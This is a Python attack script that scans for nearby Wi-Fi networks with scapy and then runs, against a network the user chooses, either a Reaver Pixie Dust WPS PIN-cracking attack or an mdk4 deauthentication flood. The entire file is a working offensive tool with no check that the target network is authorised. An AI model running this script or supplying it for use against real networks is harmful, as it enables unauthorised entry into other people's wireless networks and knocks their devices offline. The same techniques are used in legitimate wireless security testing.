''''
MIT License
Copyright (c) 2025 Alex
'''

from scapy.all import sniff, Dot11, Dot11Elt
import subprocess
import shlex
import time
import os

while True:
    try:
        # Check if the script is run with root priviileges
        if os.geteuid() != 0:
            print("This script must be run as root. Please use 'sudo'.")
            exit(1)
        break
    except Exception as e:
        print(f"An error occurred: {e}")
        exit(1)
    
while True:
    interface = input("Enter the interface name: ")
    # Check if the interface exists
    if os.path.exists(f"/sys/class/net/{interface}"):
        break
    else:
        print(f"Interface '{interface}' does not exist. Please enter a valid interface name.")



#Commands
ifdown = f"sudo ifconfig {interface} down"
iwconfig = f"sudo iwconfig {interface} mode monitor"
ifup = f"sudo ifconfig {interface} up"

# Enable monitor mode
subprocess.call(shlex.split(ifdown))
subprocess.call(shlex.split(iwconfig))
subprocess.call(shlex.split(ifup))

networks = []

def get_channel(pkt):
    elt = pkt.getlayer(Dot11Elt)
    while elt:
        if elt.ID == 3:
            #return ord(elt.info)
            if elt.info and len(elt.info) >= 1:
                return elt.info[0]

        elt = elt.payload.getlayer(Dot11Elt)
    return None

def scan_networks(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        ssid = packet.info.decode('utf-8', errors='ignore')
        bssid = packet.addr2
        channel = get_channel(packet)
        if channel is not None and not any(net['BSSID'] == bssid for net in networks):
            networks.append({'SSID': ssid, 'BSSID': bssid, 'Channel': channel})
            print(f"SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")

print("Scanning for networks (press Ctrl+C to stop)...")
try:
    sniff(iface=interface, prn=scan_networks, store=False)
except KeyboardInterrupt:
    print("\nScanning stopped by user.")

# Display networks
print("\nAvailable networks:")
for idx, net in enumerate(networks):
    print(f"{idx}: {net['SSID']} ({net['BSSID']}) on Channel {net['Channel']}")

# User selects a target
try:
    choice = int(input("Enter the number of the network to attack: "))
    target = networks[choice]
except (ValueError, IndexError):
    print("Invalid selection.")
    exit(1)

command_pixie_dust = f"reaver -i {interface} -b {target['BSSID']} -c {target['Channel']} -K 1 -f -vvv"

def run_pixie_dust():
    try:
        print("\nRunning Pixie Dust attack...")
        args = shlex.split(f"reaver -i {interface} -b {target['BSSID']} -c {target['Channel']} -K 1 -f -vvv")

        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        try:
            stdout, stderr = process.communicate(timeout=120)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            print("Pixie Dust attack stopped after 120 seconds timeout.")
            return  # Вийти , не обробляючи як успішне завершення

        if process.returncode == 0:
            print("Pixie Dust attack completed successfully.")
            print(stdout.decode())
        else:
            print("Error during Pixie Dust attack:")
            print(stderr.decode())
    except Exception as e:
        print(f"An error occurred: {e}")


def run_mdk4():
    try:
        print("\nRunning mkd4 attack...")
        # Assuming mkd4 is a command that needs to be run with specific parameters

        subprocess.call(shlex.split(f"mdk4 d -c {target['Channel']} -b {target['BSSID']} -i {interface}"))
        print("mkd4 command executed (placeholder).")
    except Exception as e:
        print(f"An error occurred: {e}")
while True:
    try:
        print("\nChoose an attack method:")
        print("1. Pixie Dust")
        print("2. mdk4")
        print("3. Exit")
        option = input("Choose attack method: ")

        if option == '1':
            run_pixie_dust()
        elif option == '2':
            run_mdk4()
        elif option == '3':
            print("Exiting.")
            break
        else:
            print("Invalid option.")
    except KeyboardInterrupt:
        print("\nExiting...")
        break